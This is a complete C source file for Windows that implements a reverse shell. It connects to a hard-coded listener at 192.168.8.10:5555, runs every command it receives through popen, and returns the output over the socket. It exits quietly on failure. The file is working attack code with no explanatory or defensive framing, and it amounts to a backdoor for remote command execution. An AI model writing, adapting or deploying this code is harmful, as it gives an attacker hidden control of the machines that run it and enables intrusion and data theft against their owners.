#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h> 

#define TARGET_IP "192.168.8.10" // The server IP
#define TARGET_PORT "5555"      // Server port
#define BUFFER_SIZE 1024
#define COMMAND_OUTPUT_MAX 4096

void execute_and_send_command(SOCKET sockfd, char *command);
void reverseConnect(const char *ip, const char *port_str);

void silent_exit() {
    WSACleanup();
    exit(EXIT_FAILURE); 
}

void execute_and_send_command(SOCKET sockfd, char *command) {
    FILE *fp;
    char path[COMMAND_OUTPUT_MAX];
    int bytes_read;
    fp = popen(command, "r");
    if (fp == NULL) {
        return;
    }
    while ((bytes_read = fread(path, 1, COMMAND_OUTPUT_MAX, fp)) > 0) {
        if (send(sockfd, path, bytes_read, 0) < 0) {
            break; 
        }
    }
    pclose(fp);
    send(sockfd, "\n", 1, 0); 
}

void reverseConnect(const char *ip, const char *port_str) {
    WSADATA wsaData;
    SOCKET sockfd = INVALID_SOCKET;
    struct sockaddr_in server_addr;
    char command_buffer[BUFFER_SIZE];
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        silent_exit();
    }  
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        silent_exit();
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(atoi(port_str)); 
    server_addr.sin_addr.s_addr = inet_addr(ip); 
    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        silent_exit();
    }
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        silent_exit(); 
    }
    while (1) {
        memset(command_buffer, 0, BUFFER_SIZE);

        int bytes_received = recv(sockfd, command_buffer, BUFFER_SIZE - 1, 0);

        if (bytes_received <= 0) {
            break; 
        }
        command_buffer[bytes_received] = '\0';
        command_buffer[strcspn(command_buffer, "\r\n")] = '\0';
        if (strncmp(command_buffer, "exit", 4) == 0) {
            break;
        }
        execute_and_send_command(sockfd, command_buffer);
    }
    closesocket(sockfd);
    WSACleanup();
}

int main() {
    reverseConnect(TARGET_IP, TARGET_PORT);
    return 0;
}
